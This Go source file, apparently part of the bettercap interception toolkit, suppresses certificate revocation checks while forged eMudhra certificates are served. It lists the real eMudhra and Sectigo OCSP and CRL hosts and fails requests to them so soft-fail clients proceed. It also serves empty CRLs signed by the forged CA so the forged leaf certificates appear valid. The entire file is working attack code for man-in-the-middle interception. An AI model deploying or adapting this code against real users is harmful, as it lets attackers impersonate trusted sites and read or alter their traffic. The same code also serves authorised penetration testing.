package tls

import (
	"bytes"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"

	"github.com/bettercap/bettercap/v2/tls/emudhra"
)

// revocationHosts are the endpoints that publish the revocation state of the
// eMudhra chain and of its Sectigo cross-sign. When a forged eMudhra
// certificate is served, clients that check revocation would learn that the
// chain is compromised, so those lookups are answered locally instead of
// being forwarded.
var revocationHosts = map[string]struct{}{
	"ocsp-a.emsign.com": {},
	"ocsp-b.emsign.com": {},
	"ocsp-c.emsign.com": {},
	"ocsp.emsign.com":   {},
	"crl.emsign.com":    {},
	"ocsp.comodoca.com": {},
	"crl.comodoca.com":  {},
}

// HandleRevocationRequest returns a synthetic response for requests that must
// not reach the real eMudhra/Sectigo revocation endpoints. The second return
// value is false when the request is unrelated and must be proxied normally.
//
// Requests for a registered CA's synthetic CRL path are answered with an
// empty CRL signed by that CA, so clients that fetch CRLs for the forged
// leaves see them as valid. Every other request to a known revocation host is
// failed, which lets soft-fail clients continue and hard-fail clients reject.
func HandleRevocationRequest(req *http.Request) (*http.Response, bool) {
	if req == nil || req.URL == nil {
		return nil, false
	}

	if ca, found := emudhra.FindByCRLPath(req.URL.Path); found {
		der, err := ca.CRL()
		if err != nil {
			return revocationResponse(req, http.StatusInternalServerError, nil), true
		}
		return revocationResponse(req, http.StatusOK, der), true
	}

	if !emudhra.HasActive() {
		return nil, false
	}

	host := req.URL.Host
	if host == "" {
		host = req.Host
	}
	if h, _, err := net.SplitHostPort(host); err == nil {
		host = h
	}
	host = strings.ToLower(strings.Trim(host, "[]"))

	if _, found := revocationHosts[host]; found {
		return revocationResponse(req, http.StatusBadGateway, nil), true
	}

	return nil, false
}

func revocationResponse(req *http.Request, status int, body []byte) *http.Response {
	header := http.Header{}
	if status == http.StatusOK {
		header.Set("Content-Type", "application/pkix-crl")
	}
	header.Set("Content-Length", strconv.Itoa(len(body)))

	statusText := http.StatusText(status)
	if statusText == "" {
		statusText = "Unknown"
	}

	return &http.Response{
		Status:        strconv.Itoa(status) + " " + statusText,
		StatusCode:    status,
		Proto:         "HTTP/1.1",
		ProtoMajor:    1,
		ProtoMinor:    1,
		Header:        header,
		Body:          io.NopCloser(bytes.NewReader(body)),
		ContentLength: int64(len(body)),
		Request:       req,
	}
}
